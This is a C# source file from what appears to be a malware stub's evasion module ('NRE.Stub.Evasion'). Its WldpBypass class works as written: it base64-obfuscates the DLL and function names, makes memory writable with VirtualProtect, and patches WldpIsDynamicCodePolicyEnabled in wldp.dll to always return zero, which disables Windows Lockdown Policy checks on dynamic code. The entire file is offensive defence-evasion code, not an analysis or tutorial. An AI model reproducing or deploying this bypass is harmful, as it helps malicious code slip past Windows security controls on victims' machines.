using System;
using System.Runtime.InteropServices;
using NRE.Core.Common;

namespace NRE.Stub.Evasion
{
    /// <summary>
    /// WLDP bypass: patch WldpIsDynamicCodePolicyEnabled to return 0 (policy disabled).
    /// </summary>
    public static class WldpBypass
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern IntPtr LoadLibrary(string lpLibFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        public static bool Patch()
        {
            try
            {
                string wldpName = RuntimeStrings.Decode("d2xkcC5kbGw=");
                IntPtr wldp = LoadLibrary(wldpName);
                if (wldp == IntPtr.Zero) return false;

                string procName = RuntimeStrings.Decode("V2xkcElzRHluYW1pY0NvZGVQb2xpY3lFbmFibGVk");
                IntPtr addr = GetProcAddress(wldp, procName);
                if (addr == IntPtr.Zero) return false;

                byte[] patch = new byte[] { 0x48, 0x31, 0xC0, 0xC3 };
                uint oldProt;
                if (!NativeMethods.VirtualProtect(addr, (UIntPtr)patch.Length, NativeMethods.PAGE_EXECUTE_READWRITE, out oldProt))
                    return false;
                try
                {
                    Marshal.Copy(patch, 0, addr, patch.Length);
                    return true;
                }
                finally
                {
                    NativeMethods.VirtualProtect(addr, (UIntPtr)patch.Length, oldProt, out oldProt);
                }
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
